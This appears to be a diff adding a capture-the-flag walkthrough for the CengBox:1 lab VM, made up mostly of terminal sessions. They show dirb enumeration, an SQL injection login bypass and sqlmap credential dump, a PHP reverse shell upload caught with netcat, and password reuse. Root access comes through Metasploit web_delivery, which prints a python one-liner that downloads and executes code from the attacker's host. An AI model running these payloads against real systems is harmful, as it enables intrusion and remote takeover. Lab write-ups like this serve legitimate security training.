@@ -27,3 +27,316 @@ http://192.168.1.18/uploads/
 Forbidden
 
 
+
+hack@kali:~/CTF/CengBox:1$ dirb http://192.168.1.18/masteradmin /usr/share/wordlists/dirb/big.txt -X .php
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Sun May 17 22:45:00 2020
+URL_BASE: http://192.168.1.18/masteradmin/
+WORDLIST_FILES: /usr/share/wordlists/dirb/big.txt
+EXTENSIONS_LIST: (.php) | (.php) [NUM = 1]
+
+-----------------
+
+GENERATED WORDS: 20458                                                         
+
+---- Scanning URL: http://192.168.1.18/masteradmin/ ----
++ http://192.168.1.18/masteradmin/db.php (CODE:200|SIZE:0)                                                           
++ http://192.168.1.18/masteradmin/login.php (CODE:200|SIZE:5137)                                                     
++ http://192.168.1.18/masteradmin/upload.php (CODE:200|SIZE:1440)                                                    
+                                                                                                                     
+-----------------
+END_TIME: Sun May 17 22:45:28 2020
+DOWNLOADED: 20458 - FOUND: 3
+
+
+
+Try to inject payload in login form:
+' or ''='
+
+it's works!!
+
+
+Capture login request with burp and use sqlmap to inject
+
+
+hack@kali:~/CTF/CengBox:1$ sqlmap -r burp.txt --dump
+
+
+Database: cengbox
+Table: admin
+[1 entry]
++------+-------------+---------------+
+| id   | username    | password      |
++------+-------------+---------------+
+| 1    | masteradmin | C3ng0v3R00T1! |
++------+-------------+---------------+
+
+
+Upload rvsell in .php.ceng extension
+
+
+
+hack@kali:~/CTF/CengBox:1$ nc -lnvp 1234
+Ncat: Version 7.80 ( https://nmap.org/ncat )
+Ncat: Listening on :::1234
+Ncat: Listening on 0.0.0.0:1234
+Ncat: Connection from 192.168.1.18.
+Ncat: Connection from 192.168.1.18:39540.
+Linux cengbox 4.4.0-178-generic #208-Ubuntu SMP Sun Apr 5 23:45:10 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+ 00:23:25 up 50 min,  0 users,  load average: 0.03, 0.01, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ 
+
+www-data@cengbox:/$ lsb_release -a
+lsb_release -a
+No LSB modules are available.
+Distributor ID: Ubuntu
+Description:    Ubuntu 16.04.6 LTS
+Release:        16.04
+Codename:       xenial
+www-data@cengbox:/$ 
+
+www-data@cengbox:/$ uname -a
+uname -a
+Linux cengbox 4.4.0-178-generic #208-Ubuntu SMP Sun Apr 5 23:45:10 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+
+
+
+cengover:x:1000:1000:cengover,,,:/home/cengover:/bin/bash
+
+
+
+www-data@cengbox:/home$ su cengover
+su cengover
+Password: C3ng0v3R00T1!
+
+cengover@cengbox:/home$ id
+id
+uid=1000(cengover) gid=1000(cengover) groups=1000(cengover),4(adm),24(cdrom),30(dip),46(plugdev),100(users),110(lxd),117(lpadmin),118(sambashare)
+cengover@cengbox:/home$ 
+
+
+
+hack@kali:~/CTF/CengBox:1$ ssh cengover@192.168.1.18
+cengover@192.168.1.18's password: 
+Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-178-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+70 packages can be updated.
+0 updates are security updates.
+
+
+Last login: Wed Apr 29 18:42:51 2020 from 192.168.0.14
+cengover@cengbox:~$ 
+cengover@cengbox:~$ 
+cengover@cengbox:~$ 
+cengover@cengbox:~$ 
+cengover@cengbox:~$ ls -la
+total 116
+drwx------ 4 cengover cengover 4096 Apr 29 18:50 .
+drwxr-xr-x 4 root     root     4096 Apr 25 23:01 ..
+-rw------- 1 cengover cengover    0 Apr 29 18:50 .bash_history
+-rw-r--r-- 1 cengover cengover  220 Apr 25 23:01 .bash_logout
+-rw-r--r-- 1 cengover cengover 3771 Apr 25 23:01 .bashrc
+drwx------ 2 cengover cengover 4096 Apr 25 23:08 .cache
+lrwxrwxrwx 1 cengover cengover   34 Apr 25 23:01 .ecryptfs -> /home/.ecryptfs/cengover/.ecryptfs
+-rw------- 1 cengover cengover  478 Apr 27 19:01 .mysql_history
+drwxrwxr-x 2 cengover cengover 4096 Apr 26 21:31 .nano
+lrwxrwxrwx 1 cengover cengover   33 Apr 25 23:01 .Private -> /home/.ecryptfs/cengover/.Private
+-rw-r--r-- 1 cengover cengover  655 Apr 25 23:01 .profile
+-rw-r--r-- 1 cengover cengover    0 Apr 25 23:10 .sudo_as_admin_successful
+-rw-rw-r-- 1 cengover cengover   33 Apr 29 18:43 user.txt
+-rw------- 1 cengover cengover 7148 Apr 29 16:12 .viminfo
+cengover@cengbox:~$ 
+cengover@cengbox:~$ 
+cengover@cengbox:~$ cat user.txt 
+8f7f6471e2e869f029a75c5de601d5e0
+
+
+Downloaded LineEnum and start enumerate
+Nothing interesting...
+Start pspy64s..
+
+
+2020/05/18 00:47:01 CMD: UID=0    PID=4181   | /bin/sh -c /usr/bin/python3 /opt/md5check.py 
+
+
+msf5 > use exploit/multi/script/web_delivery 
+msf5 exploit(multi/script/web_delivery) > 
+msf5 exploit(multi/script/web_delivery) > 
+msf5 exploit(multi/script/web_delivery) > 
+msf5 exploit(multi/script/web_delivery) > 
+msf5 exploit(multi/script/web_delivery) > 
+msf5 exploit(multi/script/web_delivery) > show targets 
+
+Exploit targets:
+
+   Id  Name
+   --  ----
+   0   Python
+   1   PHP
+   2   PSH
+   3   Regsvr32
+   4   pubprn
+   5   PSH (Binary)
+   6   Linux
+   7   Mac OS X
+
+
+msf5 exploit(multi/script/web_delivery) > set target 0
+target => 0
+msf5 exploit(multi/script/web_delivery) > 
+msf5 exploit(multi/script/web_delivery) > set payload
+set payload                    set payloaduuidraw
+set payloadprocesscommandline  set payloaduuidseed
+set payloaduuidname            set payloaduuidtracking
+msf5 exploit(multi/script/web_delivery) > set payload 
+set payload generic/custom
+set payload generic/shell_bind_tcp
+set payload generic/shell_reverse_tcp
+set payload multi/meterpreter/reverse_http
+set payload multi/meterpreter/reverse_https
+set payload python/meterpreter/bind_tcp
+set payload python/meterpreter/bind_tcp_uuid
+set payload python/meterpreter/reverse_http
+set payload python/meterpreter/reverse_https
+set payload python/meterpreter/reverse_tcp
+set payload python/meterpreter/reverse_tcp_ssl
+set payload python/meterpreter/reverse_tcp_uuid
+set payload python/meterpreter_bind_tcp
+set payload python/meterpreter_reverse_http
+set payload python/meterpreter_reverse_https
+set payload python/meterpreter_reverse_tcp
+set payload python/pingback_bind_tcp
+set payload python/pingback_reverse_tcp
+set payload python/shell_bind_tcp
+set payload python/shell_reverse_tcp
+set payload python/shell_reverse_tcp_ssl
+set payload python/shell_reverse_udp
+msf5 exploit(multi/script/web_delivery) > set payload python/
+set payload python/meterpreter/bind_tcp
+set payload python/meterpreter/bind_tcp_uuid
+set payload python/meterpreter/reverse_http
+set payload python/meterpreter/reverse_https
+set payload python/meterpreter/reverse_tcp
+set payload python/meterpreter/reverse_tcp_ssl
+set payload python/meterpreter/reverse_tcp_uuid
+set payload python/meterpreter_bind_tcp
+set payload python/meterpreter_reverse_http
+set payload python/meterpreter_reverse_https
+set payload python/meterpreter_reverse_tcp
+set payload python/pingback_bind_tcp
+set payload python/pingback_reverse_tcp
+set payload python/shell_bind_tcp
+set payload python/shell_reverse_tcp
+set payload python/shell_reverse_tcp_ssl
+set payload python/shell_reverse_udp
+msf5 exploit(multi/script/web_delivery) > set payload python/meterpreter/reverse_tcp
+payload => python/meterpreter/reverse_tcp
+msf5 exploit(multi/script/web_delivery) > 
+msf5 exploit(multi/script/web_delivery) > 
+msf5 exploit(multi/script/web_delivery) > 
+msf5 exploit(multi/script/web_delivery) > show options 
+
+Module options (exploit/multi/script/web_delivery):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SRVHOST  0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
+   SRVPORT  8080             yes       The local port to listen on.
+   SSL      false            no        Negotiate SSL for incoming connections
+   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
+   URIPATH                   no        The URI to use for this exploit (default is random)
+
+
+Payload options (python/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Python
+
+
+msf5 exploit(multi/script/web_delivery) > set lhost 192.168.1.14
+lhost => 192.168.1.14
+msf5 exploit(multi/script/web_delivery) > run
+[*] Exploit running as background job 0.
+[*] Exploit completed, but no session was created.
+
+[*] Started reverse TCP handler on 192.168.1.14:4444 
+[*] Using URL: http://0.0.0.0:8080/D0Idct0JL
+msf5 exploit(multi/script/web_delivery) > [*] Local IP: http://192.168.1.14:8080/D0Idct0JL
+[*] Server started.
+[*] Run the following command on the target machine:
+python -c "import sys;import ssl;u=__import__('urllib'+{2:'',3:'.request'}[sys.version_info[0]],fromlist=('urlopen',));r=u.urlopen('http://192.168.1.14:8080/D0Idct0JL', context=ssl._create_unverified_context());exec(r.read());"
+[*] 192.168.1.18     web_delivery - Delivering Payload (450 bytes)
+[*] Sending stage (53755 bytes) to 192.168.1.18
+[*] Meterpreter session 1 opened (192.168.1.14:4444 -> 192.168.1.18:57276) at 2020-05-17 23:59:01 +0200
+id
+[*] exec: id
+
+uid=1000(hack) gid=1000(hack) gruppi=1000(hack),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),120(bluetooth),136(scanner)
+msf5 exploit(multi/script/web_delivery) > 
+msf5 exploit(multi/script/web_delivery) > 
+msf5 exploit(multi/script/web_delivery) > sessions -l
+
+Active sessions
+===============
+
+  Id  Name  Type                      Information     Connection
+  --  ----  ----                      -----------     ----------
+  1         meterpreter python/linux  root @ cengbox  192.168.1.14:4444 -> 192.168.1.18:57276 (192.168.1.18)
+
+msf5 exploit(multi/script/web_delivery) > sessions 1
+[*] Starting interaction with 1...
+
+meterpreter > getuid
+Server username: root
+meterpreter > ls
+Listing: /root
+==============
+
+Mode              Size   Type  Last modified              Name
+----              ----   ----  -------------              ----
+100600/rw-------  5      fil   2020-04-29 17:50:28 +0200  .bash_history
+100644/rw-r--r--  3106   fil   2020-04-25 21:51:03 +0200  .bashrc
+40755/rwxr-xr-x   4096   dir   2020-04-26 12:30:38 +0200  .nano
+100644/rw-r--r--  148    fil   2020-04-25 21:51:03 +0200  .profile
+100644/rw-r--r--  66     fil   2020-04-28 12:48:09 +0200  .selected_editor
+100600/rw-------  5362   fil   2020-04-29 17:50:19 +0200  .viminfo
+100644/rw-r--r--  11590  fil   2020-05-17 23:59:01 +0200  note.txt
+100644/rw-r--r--  420    fil   2020-04-29 17:50:19 +0200  root.txt
+
+
+
+
+meterpreter > cat root.txt
+ / ____|  ____|           |  _ \           
+| |    | |__   _ __   __ _| |_) | _____  __
+| |    |  __| | '_ \ / _` |  _ < / _ \ \/ /
+| |____| |____| | | | (_| | |_) | (_) >  < 
+ \_____|______|_| |_|\__, |____/ \___/_/\_\
+                      __/ |                
+                     |___/                 
+
+Congrats. Hope you enjoyed it and you can contact me on Twitter @arslanblcn_
+
+a51e522b22a439b8e1b22d84f71cf0f2
+
